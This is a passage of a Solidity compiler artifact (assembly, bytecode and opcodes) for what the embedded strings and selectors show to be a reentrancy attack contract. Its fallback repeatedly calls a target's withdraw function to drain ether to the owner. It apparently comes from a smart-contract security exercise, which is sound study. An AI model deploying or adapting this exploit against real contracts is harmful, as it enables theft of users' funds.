0x4e6f74206f776e65722100000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2843:2844   */\n      0x00\n        /* \"#utility.yul\":2835:2841   */\n      dup3\n        /* \"#utility.yul\":2831:2845   */\n      add\n        /* \"#utility.yul\":2824:2860   */\n      mstore\n        /* \"#utility.yul\":2707:2867   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2873:3239   */\n    tag_70:\n        /* \"#utility.yul\":3015:3018   */\n      0x00\n        /* \"#utility.yul\":3036:3103   */\n      tag_112\n        /* \"#utility.yul\":3100:3102   */\n      0x0a\n        /* \"#utility.yul\":3095:3098   */\n      dup4\n        /* \"#utility.yul\":3036:3103   */\n      tag_58\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":3029:3103   */\n      swap2\n      pop\n        /* \"#utility.yul\":3112:3205   */\n      tag_113\n        /* \"#utility.yul\":3201:3204   */\n      dup3\n        /* \"#utility.yul\":3112:3205   */\n      tag_69\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":3230:3232   */\n      0x20\n        /* \"#utility.yul\":3225:3228   */\n      dup3\n        /* \"#utility.yul\":3221:3233   */\n      add\n        /* \"#utility.yul\":3214:3233   */\n      swap1\n      pop\n        /* \"#utility.yul\":2873:3239   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3245:3664   */\n    tag_33:\n        /* \"#utility.yul\":3411:3415   */\n      0x00\n        /* \"#utility.yul\":3449:3451   */\n      0x20\n        /* \"#utility.yul\":3438:3447   */\n      dup3\n        /* \"#utility.yul\":3434:3452   */\n      add\n        /* \"#utility.yul\":3426:3452   */\n      swap1\n      pop\n        /* \"#utility.yul\":3498:3507   */\n      dup2\n        /* \"#utility.yul\":3492:3496   */\n      dup2\n        /* \"#utility.yul\":3488:3508   */\n      sub\n        /* \"#utility.yul\":3484:3485   */\n      0x00\n        /* \"#utility.yul\":3473:3482   */\n      dup4\n        /* \"#utility.yul\":3469:3486   */\n      add\n        /* \"#utility.yul\":3462:3509   */\n      mstore\n        /* \"#utility.yul\":3526:3657   */\n      tag_115\n        /* \"#utility.yul\":3652:3656   */\n      dup2\n        /* \"#utility.yul\":3526:3657   */\n      tag_70\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":3518:3657   */\n      swap1\n      pop\n        /* \"#utility.yul\":3245:3664   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3670:3817   */\n    tag_71:\n        /* \"#utility.yul\":3771:3782   */\n      0x00\n        /* \"#utility.yul\":3808:3811   */\n      dup2\n        /* \"#utility.yul\":3793:3811   */\n      swap1\n      pop\n        /* \"#utility.yul\":3670:3817   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3823:3937   */\n    tag_72:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3943:4341   */\n    tag_73:\n        /* \"#utility.yul\":4102:4105   */\n      0x00\n        /* \"#utility.yul\":4123:4206   */\n      tag_119\n        /* \"#utility.yul\":4204:4205   */\n      0x00\n        /* \"#utility.yul\":4199:4202   */\n      dup4\n        /* \"#utility.yul\":4123:4206   */\n      tag_71\n      jump\t// in\n    tag_119:\n        /* \"#utility.yul\":4116:4206   */\n      swap2\n      pop\n        /* \"#utility.yul\":4215:4308   */\n      tag_120\n        /* \"#utility.yul\":4304:4307   */\n      dup3\n        /* \"#utility.yul\":4215:4308   */\n      tag_72\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":4333:4334   */\n      0x00\n        /* \"#utility.yul\":4328:4331   */\n      dup3\n        /* \"#utility.yul\":4324:4335   */\n      add\n        /* \"#utility.yul\":4317:4335   */\n      swap1\n      pop\n        /* \"#utility.yul\":3943:4341   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4347:4726   */\n    tag_35:\n        /* \"#utility.yul\":4531:4534   */\n      0x00\n        /* \"#utility.yul\":4553:4700   */\n      tag_122\n        /* \"#utility.yul\":4696:4699   */\n      dup3\n        /* \"#utility.yul\":4553:4700   */\n      tag_73\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":4546:4700   */\n      swap2\n      pop\n        /* \"#utility.yul\":4717:4720   */\n      dup2\n        /* \"#utility.yul\":4710:4720   */\n      swap1\n      pop\n        /* \"#utility.yul\":4347:4726   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4732:4901   */\n    tag_74:\n        /* \"#utility.yul\":4872:4893   */\n      0x5472616e73616374696f6e204661696c65642100000000000000000000000000\n        /* \"#utility.yul\":4868:4869   */\n      0x00\n        /* \"#utility.yul\":4860:4866   */\n      dup3\n        /* \"#utility.yul\":4856:4870   */\n      add\n        /* \"#utility.yul\":4849:4894   */\n      mstore\n        /* \"#utility.yul\":4732:4901   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4907:5273   */\n    tag_75:\n        /* \"#utility.yul\":5049:5052   */\n      0x00\n        /* \"#utility.yul\":5070:5137   */\n      tag_125\n        /* \"#utility.yul\":5134:5136   */\n      0x13\n        /* \"#utility.yul\":5129:5132   */\n      dup4\n        /* \"#utility.yul\":5070:5137   */\n      tag_58\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":5063:5137   */\n      swap2\n      pop\n        /* \"#utility.yul\":5146:5239   */\n      tag_126\n        /* \"#utility.yul\":5235:5238   */\n      dup3\n        /* \"#utility.yul\":5146:5239   */\n      tag_74\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":5264:5266   */\n      0x20\n        /* \"#utility.yul\":5259:5262   */\n      dup3\n        /* \"#utility.yul\":5255:5267   */\n      add\n        /* \"#utility.yul\":5248:5267   */\n      swap1\n      pop\n        /* \"#utility.yul\":4907:5273   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5279:5698   */\n    tag_41:\n        /* \"#utility.yul\":5445:5449   */\n      0x00\n        /* \"#utility.yul\":5483:5485   */\n      0x20\n        /* \"#utility.yul\":5472:5481   */\n      dup3\n        /* \"#utility.yul\":5468:5486   */\n      add\n        /* \"#utility.yul\":5460:5486   */\n      swap1\n      pop\n        /* \"#utility.yul\":5532:5541   */\n      dup2\n        /* \"#utility.yul\":5526:5530   */\n      dup2\n        /* \"#utility.yul\":5522:5542   */\n      sub\n        /* \"#utility.yul\":5518:5519   */\n      0x00\n        /* \"#utility.yul\":5507:5516   */\n      dup4\n        /* \"#utility.yul\":5503:5520   */\n      add\n        /* \"#utility.yul\":5496:5543   */\n      mstore\n        /* \"#utility.yul\":5560:5691   */\n      tag_128\n        /* \"#utility.yul\":5686:5690   */\n      dup2\n        /* \"#utility.yul\":5560:5691   */\n      tag_75\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":5552:5691   */\n      swap1\n      pop\n        /* \"#utility.yul\":5279:5698   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5704:5781   */\n    tag_76:\n        /* \"#utility.yul\":5741:5748   */\n      0x00\n        /* \"#utility.yul\":5770:5775   */\n      dup2\n        /* \"#utility.yul\":5759:5775   */\n      swap1\n      pop\n        /* \"#utility.yul\":5704:5781   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5787:5905   */\n    tag_77:\n        /* \"#utility.yul\":5874:5898   */\n      tag_131\n        /* \"#utility.yul\":5892:5897   */\n      dup2\n        /* \"#utility.yul\":5874:5898   */\n      tag_76\n      jump\t// in\n    tag_131:\n        /* \"#utility.yul\":5869:5872   */\n      dup3\n        /* \"#utility.yul\":5862:5899   */\n      mstore\n        /* \"#utility.yul\":5787:5905   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5911:6243   */\n    tag_43:\n        /* \"#utility.yul\":6032:6036   */\n      0x00\n        /* \"#utility.yul\":6070:6072   */\n      0x40\n        /* \"#utility.yul\":6059:6068   */\n      dup3\n        /* \"#utility.yul\":6055:6073   */\n      add\n        /* \"#utility.yul\":6047:6073   */\n      swap1\n      pop\n        /* \"#utility.yul\":6083:6154   */\n      tag_133\n        /* \"#utility.yul\":6151:6152   */\n      0x00\n        /* \"#utility.yul\":6140:6149   */\n      dup4\n        /* \"#utility.yul\":6136:6153   */\n      add\n        /* \"#utility.yul\":6127:6133   */\n      dup6\n        /* \"#utility.yul\":6083:6154   */\n      tag_68\n      jump\t// in\n    tag_133:\n        /* \"#utility.yul\":6164:6236   */\n      tag_134\n        /* \"#utility.yul\":6232:6234   */\n      0x20\n        /* \"#utility.yul\":6221:6230   */\n      dup4\n        /* \"#utility.yul\":6217:6235   */\n      add\n        /* \"#utility.yul\":6208:6214   */\n      dup5\n        /* \"#utility.yul\":6164:6236   */\n      tag_77\n      jump\t// in\n    tag_134:\n        /* \"#utility.yul\":5911:6243   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6249:6416   */\n    tag_78:\n        /* \"#utility.yul\":6389:6408   */\n      0x4465706f73697420636f6d706c65746564000000000000000000000000000000\n        /* \"#utility.yul\":6385:6386   */\n      0x00\n        /* \"#utility.yul\":6377:6383   */\n      dup3\n        /* \"#utility.yul\":6373:6387   */\n      add\n        /* \"#utility.yul\":6366:6409   */\n      mstore\n        /* \"#utility.yul\":6249:6416   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6422:6788   */\n    tag_79:\n        /* \"#utility.yul\":6564:6567   */\n      0x00\n        /* \"#utility.yul\":6585:6652   */\n      tag_137\n        /* \"#utility.yul\":6649:6651   */\n      0x11\n        /* \"#utility.yul\":6644:6647   */\n      dup4\n        /* \"#utility.yul\":6585:6652   */\n      tag_58\n      jump\t// in\n    tag_137:\n        /* \"#utility.yul\":6578:6652   */\n      swap2\n      pop\n        /* \"#utility.yul\":6661:6754   */\n      tag_138\n        /* \"#utility.yul\":6750:6753   */\n      dup3\n        /* \"#utility.yul\":6661:6754   */\n      tag_78\n      jump\t// in\n    tag_138:\n        /* \"#utility.yul\":6779:6781   */\n      0x20\n        /* \"#utility.yul\":6774:6777   */\n      dup3\n        /* \"#utility.yul\":6770:6782   */\n      add\n        /* \"#utility.yul\":6763:6782   */\n      swap1\n      pop\n        /* \"#utility.yul\":6422:6788   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6794:7213   */\n    tag_52:\n        /* \"#utility.yul\":6960:6964   */\n      0x00\n        /* \"#utility.yul\":6998:7000   */\n      0x20\n        /* \"#utility.yul\":6987:6996   */\n      dup3\n        /* \"#utility.yul\":6983:7001   */\n      add\n        /* \"#utility.yul\":6975:7001   */\n      swap1\n      pop\n        /* \"#utility.yul\":7047:7056   */\n      dup2\n        /* \"#utility.yul\":7041:7045   */\n      dup2\n        /* \"#utility.yul\":7037:7057   */\n      sub\n        /* \"#utility.yul\":7033:7034   */\n      0x00\n        /* \"#utility.yul\":7022:7031   */\n      dup4\n        /* \"#utility.yul\":7018:7035   */\n      add\n        /* \"#utility.yul\":7011:7058   */\n      mstore\n        /* \"#utility.yul\":7075:7206   */\n      tag_140\n        /* \"#utility.yul\":7201:7205   */\n      dup2\n        /* \"#utility.yul\":7075:7206   */\n      tag_79\n      jump\t// in\n    tag_140:\n        /* \"#utility.yul\":7067:7206   */\n      swap1\n      pop\n        /* \"#utility.yul\":6794:7213   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7219:7384   */\n    tag_80:\n        /* \"#utility.yul\":7359:7376   */\n      0x57697468647261772063616c6c65640000000000000000000000000000000000\n        /* \"#utility.yul\":7355:7356   */\n      0x00\n        /* \"#utility.yul\":7347:7353   */\n      dup3\n        /* \"#utility.yul\":7343:7357   */\n      add\n        /* \"#utility.yul\":7336:7377   */\n      mstore\n        /* \"#utility.yul\":7219:7384   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7390:7756   */\n    tag_81:\n        /* \"#utility.yul\":7532:7535   */\n      0x00\n        /* \"#utility.yul\":7553:7620   */\n      tag_143\n        /* \"#utility.yul\":7617:7619   */\n      0x0f\n        /* \"#utility.yul\":7612:7615   */\n      dup4\n        /* \"#utility.yul\":7553:7620   */\n      tag_58\n      jump\t// in\n    tag_143:\n        /* \"#utility.yul\":7546:7620   */\n      swap2\n      pop\n        /* \"#utility.yul\":7629:7722   */\n      tag_144\n        /* \"#utility.yul\":7718:7721   */\n      dup3\n        /* \"#utility.yul\":7629:7722   */\n      tag_80\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":7747:7749   */\n      0x20\n        /* \"#utility.yul\":7742:7745   */\n      dup3\n        /* \"#utility.yul\":7738:7750   */\n      add\n        /* \"#utility.yul\":7731:7750   */\n      swap1\n      pop\n        /* \"#utility.yul\":7390:7756   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7762:8181   */\n    tag_57:\n        /* \"#utility.yul\":7928:7932   */\n      0x00\n        /* \"#utility.yul\":7966:7968   */\n      0x20\n        /* \"#utility.yul\":7955:7964   */\n      dup3\n        /* \"#utility.yul\":7951:7969   */\n      add\n        /* \"#utility.yul\":7943:7969   */\n      swap1\n      pop\n        /* \"#utility.yul\":8015:8024   */\n      dup2\n        /* \"#utility.yul\":8009:8013   */\n      dup2\n        /* \"#utility.yul\":8005:8025   */\n      sub\n        /* \"#utility.yul\":8001:8002   */\n      0x00\n        /* \"#utility.yul\":7990:7999   */\n      dup4\n        /* \"#utility.yul\":7986:8003   */\n      add\n        /* \"#utility.yul\":7979:8026   */\n      mstore\n        /* \"#utility.yul\":8043:8174   */\n      tag_146\n        /* \"#utility.yul\":8169:8173   */\n      dup2\n        /* \"#utility.yul\":8043:8174   */\n      tag_81\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":8035:8174   */\n      swap1\n      pop\n        /* \"#utility.yul\":7762:8181   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122039083e2e9d525e02319dba206362a1a81327b9a97d951318ed14625abf1a75fd64736f6c63430008180033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052604051610af7380380610af783398181016040528101906100259190610108565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610133565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100d7826100ae565b9050919050565b6100e7816100cd565b81146100f1575f80fd5b50565b5f81519050610102816100de565b92915050565b5f6020828403121561011d5761011c6100aa565b5b5f61012a848285016100f4565b91505092915050565b6109b7806101405f395ff3fe608060405260043610610042575f3560e01c8063144166ae146101515780635b9806281461017b5780638da5cb5b146101915780639e5faafc146101bb57610043565b5b3373ffffffffffffffffffffffffffffffffffffffff167f16b30085abcb26f55a35299592de22f97112dc376a3a7d9245b530b4e76a102160405161008790610677565b60405180910390a2670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061014f575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610138575f80fd5b505af115801561014a573d5f803e3d5ffd5b505050505b005b34801561015c575f80fd5b506101656101c5565b604051610172919061070f565b60405180910390f35b348015610186575f80fd5b5061018f6101e8565b005b34801561019c575f80fd5b506101a56103a2565b6040516101b29190610748565b60405180910390f35b6101c36103c7565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610277576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161026e906107ab565b60405180910390fd5b5f4790505f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16826040516102c1906107f6565b5f6040518083038185875af1925050503d805f81146102fb576040519150601f19603f3d011682016040523d82523d5f602084013e610300565b606091505b5050905080610344576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161033b90610854565b60405180910390fd5b7f067e335270006737485da9eba56ed0753a5339fffc5dc1b53ea849447c98db5460015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff168360405161039692919061088a565b60405180910390a15050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610456576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161044d906107ab565b60405180910390fd5b7fce47de3ada8bbc7bfa5119dcccfa33a2a79fc932531d5ece6a80a32547f0b7a3336040516104859190610748565b60405180910390a15f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156104f2575f80fd5b505af1158015610504573d5f803e3d5ffd5b50505050503373ffffffffffffffffffffffffffffffffffffffff167f16b30085abcb26f55a35299592de22f97112dc376a3a7d9245b530b4e76a102160405161054d906108fb565b60405180910390a25f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156105b9575f80fd5b505af11580156105cb573d5f803e3d5ffd5b505050503373ffffffffffffffffffffffffffffffffffffffff167f16b30085abcb26f55a35299592de22f97112dc376a3a7d9245b530b4e76a102160405161061390610963565b60405180910390a2565b5f82825260208201905092915050565b7f46616c6c6261636b2074726967676572656400000000000000000000000000005f82015250565b5f61066160128361061d565b915061066c8261062d565b602082019050919050565b5f6020820190508181035f83015261068e81610655565b9050919050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f6106d76106d26106cd84610695565b6106b4565b610695565b9050919050565b5f6106e8826106bd565b9050919050565b5f6106f9826106de565b9050919050565b610709816106ef565b82525050565b5f6020820190506107225f830184610700565b92915050565b5f61073282610695565b9050919050565b61074281610728565b82525050565b5f60208201905061075b5f830184610739565b92915050565b7f4e6f74206f776e657221000000000000000000000000000000000000000000005f82015250565b5f610795600a8361061d565b91506107a082610761565b602082019050919050565b5f6020820190508181035f8301526107c281610789565b9050919050565b5f81905092915050565b50565b5f6107e15f836107c9565b91506107ec826107d3565b5f82019050919050565b5f610800826107d6565b9150819050919050565b7f5472616e73616374696f6e204661696c656421000000000000000000000000005f82015250565b5f61083e60138361061d565b91506108498261080a565b602082019050919050565b5f6020820190508181035f83015261086b81610832565b9050919050565b5f819050919050565b61088481610872565b82525050565b5f60408201905061089d5f830185610739565b6108aa602083018461087b565b9392505050565b7f4465706f73697420636f6d706c657465640000000000000000000000000000005f82015250565b5f6108e560118361061d565b91506108f0826108b1565b602082019050919050565b5f6020820190508181035f830152610912816108d9565b9050919050565b7f57697468647261772063616c6c656400000000000000000000000000000000005f82015250565b5f61094d600f8361061d565b915061095882610919565b602082019050919050565b5f6020820190508181035f83015261097a81610941565b905091905056fea264697066735822122039083e2e9d525e02319dba206362a1a81327b9a97d951318ed14625abf1a75fd64736f6c63430008180033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0xAF7 CODESIZE SUB DUP1 PUSH2 0xAF7 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0x108 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x133 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xD7 DUP3 PUSH2 0xAE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE7 DUP2 PUSH2 0xCD JUMP JUMPDEST DUP2 EQ PUSH2 0xF1 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x102 DUP2 PUSH2 0xDE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x11D JUMPI PUSH2 0x11C PUSH2 0xAA JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x12A DUP5 DUP3 DUP6 ADD PUSH2 0xF4 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x9B7 DUP1 PUSH2 0x140 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x144166AE EQ PUSH2 0x151 JUMPI DUP1 PUSH4 0x5B980628 EQ PUSH2 0x17B JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x191 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x1BB JUMPI PUSH2 0x43 JUMP JUMPDEST JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x16B30085ABCB26F55A35299592DE22F97112DC376A3A7D9245B530B4E76A1021 PUSH1 0x40 MLOAD PUSH2 0x87 SWAP1 PUSH2 0x677 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 PUSH8 0xDE0B6B3A7640000 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x14F JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x138 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x14A JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x15C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x165 PUSH2 0x1C5 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x172 SWAP2 SWAP1 PUSH2 0x70F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x186 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x18F PUSH2 0x1E8 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x19C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x1A5 PUSH2 0x3A2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1B2 SWAP2 SWAP1 PUSH2 0x748 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1C3 PUSH2 0x3C7 JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x277 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x26E SWAP1 PUSH2 0x7AB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 SELFBALANCE SWAP1 POP PUSH0 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH2 0x2C1 SWAP1 PUSH2 0x7F6 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x2FB JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x300 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x344 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x33B SWAP1 PUSH2 0x854 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH32 0x67E335270006737485DA9EBA56ED0753A5339FFFC5DC1B53EA849447C98DB54 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH1 0x40 MLOAD PUSH2 0x396 SWAP3 SWAP2 SWAP1 PUSH2 0x88A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x456 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x44D SWAP1 PUSH2 0x7AB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH32 0xCE47DE3ADA8BBC7BFA5119DCCCFA33A2A79FC932531D5ECE6A80A32547F0B7A3 CALLER PUSH1 0x40 MLOAD PUSH2 0x485 SWAP2 SWAP1 PUSH2 0x748 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL 